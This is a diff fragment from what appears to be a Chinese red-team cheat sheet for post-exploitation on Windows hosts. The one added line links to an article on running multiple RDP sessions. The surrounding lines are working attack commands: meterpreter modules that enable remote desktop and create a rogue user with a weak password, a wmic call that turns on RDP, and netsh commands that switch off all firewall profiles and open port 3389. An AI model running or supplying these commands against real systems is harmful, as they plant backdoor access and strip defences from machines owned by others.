@@ -11,6 +11,7 @@ meter> upload /root/fscan64.exe # 1.ipconfig 查看网段, # 2.arp -a # 2.1 rout
 meterpreter > run post/windows/manage/enable_rdp # 开 rdp
 meterpreter > run getgui -e                      # 开启远程桌面
 meterpreter > run getgui -u xiaowei -p 123456    # 创建用户
+### [『红蓝对抗』RDP 多开小技巧](https://mp.weixin.qq.com/s/ji7YpWe1OyyhSlDOYydzWw)
 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1                              # 开启3389远程桌面
 netsh advfirewall set allprofiles state off 
 netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes                                 # M2: 放行3389
